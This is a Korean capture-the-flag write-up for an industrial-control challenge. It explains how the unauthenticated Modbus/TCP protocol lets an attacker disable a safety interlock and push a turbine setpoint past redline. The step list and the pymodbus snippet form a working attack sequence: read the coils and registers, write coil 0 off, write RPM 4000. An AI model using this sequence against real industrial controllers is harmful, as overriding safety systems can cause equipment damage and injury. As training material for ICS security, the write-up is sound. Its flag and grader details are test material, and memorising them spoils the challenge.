# ICS-000 — 안전 인터록 우회 (실 Modbus/TCP) 라이트업

- 분야: ics / 난이도: medium
- MITRE ATT&CK for ICS: T0836(Modify Parameter), T0858(Change Operating Mode), T0878(Alarm Suppression)

## 무엇이 달라졌나 (목업 → 실 프로토콜)
이 챌린지는 **진짜 Modbus/TCP**(포트 5020)를 말한다. 프로토콜 코어는 플랫폼 트윈과
동일한 `shared/ics/modbus.py` 를 재사용하므로 `pymodbus`·`mbpoll`·metasploit
`auxiliary/scanner/scada/modbusclient` 가 그대로 붙는다. 취약점은 노출된 "키"가 아니라
**Modbus 프로토콜에 인증이 없다는 실제 약점**이다.

## 의도된 해법
1. `FC1`(read coils) coil[0] → SAFETY_INTERLOCK 상태 정찰.
2. `FC3`(read holding) holding[0..3] → RPM_SETPOINT/ACTUAL/REDLINE(3600)/STATUS 정찰.
3. `FC5`(write single coil) coil[0]=0 → **안전 인터록(SIS) 해제**.
4. `FC16`(write multiple registers) holding[0]=레드라인+α → **과속 사보타주**.
5. `GET /status?team_id=<팀>` → `compromised:true` + `flag{modbus_interlock_bypass_<hmac12>}`.

인터록을 해제하지 않고 과속만 쓰면 SIS 가 RPM_ACTUAL 을 레드라인으로 클램프하고 트립
(STATUS=1)시켜 사보타주가 성립하지 않는다 — 반드시 3번(인터록 우회)이 선행돼야 한다.

## 실도구 예시 (pymodbus)
```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("<host>", port=5020); c.connect()
c.read_coils(0, 1)                # 인터록 상태
c.read_holding_registers(0, 4)    # 레지스터 맵
c.write_coil(0, False)            # SIS 해제
c.write_registers(0, [4000])      # 과속
```

## 검증
- 스키마: `schema_validate.py --challenge ICS-000`.
- 로컬 라이브: `docker compose -f deploy/docker-compose.yaml up --build` 후
  `python solution/exploit.py`(raw 소켓 실 Modbus 왕복) → 플래그. `red_grader.grade_red` 통과.
- 팀별 HMAC 으로 플래그가 유니크(감사 S-3 위조 방지 유지).
